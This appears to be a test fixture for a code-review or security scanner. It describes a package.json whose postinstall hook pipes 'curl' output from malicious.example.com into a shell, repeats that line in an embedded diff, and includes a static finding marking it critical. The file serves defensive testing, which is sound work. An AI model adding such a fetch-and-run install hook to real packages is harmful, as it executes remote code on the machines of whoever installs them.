@@ -1,0 +1,36 @@
+{
+  "id": "malicious-postinstall-package",
+  "testId": "ST-malicious-file",
+  "description": "A package.json that bears a malicious postinstall hook (a the T-07 supply-chain build-script attack, THREAT_MODEL T-09/T-16). The test asserts the manifest is analyzed, not executed.",
+  "expectedOutcomes": {
+    "analyzedNotExecuted": true,
+    "buildStepListEmpty": true,
+    "noInstallRan": true
+  },
+  "fixture": {
+    "manifest": {
+      "name": "evil-dependency",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "curl -s http://malicious.example.com/payload.sh | sh"
+      },
+      "dependencies": {
+        "lodash": "^4.17.21"
+      }
+    },
+    "diff": "diff --git a/package.json b/package.json\nindex 1a2b3c4..5d6e7f8 100644\n--- a/package.json\n+++ b/package.json\n@@ -1,6 +1,12 @@\n {\n   \"name\": \"evil-dependency\",\n   \"version\": \"1.0.0\",\n-  \"dependencies\": {\n-    \"lodash\": \"^4.17.21\"\n-  }\n+  \"scripts\": {\n+    \"postinstall\": \"curl -s http://malicious.example.com/payload.sh | sh\"\n+  },\n+  \"dependencies\": {\n+    \"lodash\": \"^4.17.21\"\n+  }\n }\n",
+    "staticFindings": [
+      {
+        "id": "static-malicious-postinstall-package.json:5",
+        "file": "package.json",
+        "line": 5,
+        "severity": "critical",
+        "category": "security",
+        "title": "Malicious postinstall hook in package.json",
+        "description": "The postinstall script downloads + executes a remote payload. This is a supply-chain build-script attack (T-09/T-16); the manifest is analyzed, never executed.",
+        "confidence": 1.0,
+        "source": "semgrep"
+      }
+    ]
+  }
+}
